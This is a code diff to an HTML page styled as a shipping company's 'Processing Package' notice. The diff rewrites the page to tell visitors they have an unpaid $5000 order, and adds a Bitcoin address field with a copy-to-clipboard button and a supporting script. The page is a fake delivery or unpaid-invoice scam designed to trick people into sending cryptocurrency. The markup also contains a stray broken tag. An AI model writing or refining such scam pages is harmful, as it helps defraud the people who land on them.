@@ -8,13 +8,54 @@
     <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="css/style.css">
+
 </head>
  
 <body>
-    <div class="container text-center">
-        <h1 class="mt-5">Processing Package - </h1>
-        <p class="lead">Your package is being processed , you have not paid and therefore we cant process your shipment.</p>
+<style> .copy-address {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f1f1f1;
+            border-radius: 8px;
+            position: relative;
+        }
 
+        .copy-address input[type="text"] {
+            width: calc(100% - 32px);
+            padding: 10px;
+            border: none;
+            background-color: transparent;
+            outline: none;
+            font-size: 16px;
+        }
+
+        .copy-button {
+            position: absolute;
+            top: 50%;
+            right: 0;
+            transform: translateY(-50%);
+            padding: 8px 15px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+   </style>
+    <div class="container text-center">
+        <h1 class="mt-5">Processing Package </h1>
+        <p class="lead">Your package is being processed , however we noticed you have not paid and therefore we cant process your shipment.</p>
+       <
+        <h1>You have an unpaid order of $5000 </h1>
+        <p>Click on the button below to copy the  BTC payment address   </p>
+        
+
+<div class="copy-address">
+            <p>Copy the payment address below:</p>
+            <input type="text" value="1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2" id="cryptoAddress" readonly>
+            <button class="copy-button" onclick="copyAddress()">Copy</button>
+        </div>
+    </div>
     </div>
 
     <!-- Your footer here -->
@@ -25,7 +66,7 @@
                     <div class="border-top pt-5">
                         <p>
                             <!-- Link back to your site or remove it if not necessary. -->
-                            <a href="index.html">Back to Home</a>
+                            <a href="index.html">Back to Home</a> <br>
                             <a href="customer.care@fastshipper.org">Customer Care</a>
 
                         </p>
@@ -33,7 +74,14 @@
                 </div>
             </div>
         </div>
-    </footer>
+ <script>
+        function copyAddress() {
+            var copyText = document.getElementById("cryptoAddress");
+            copyText.select();
+            document.execCommand("copy");
+            alert("Address copied to clipboard: " + copyText.value);
+        }
+    </script>    </footer>
 </body>
 
 </html>
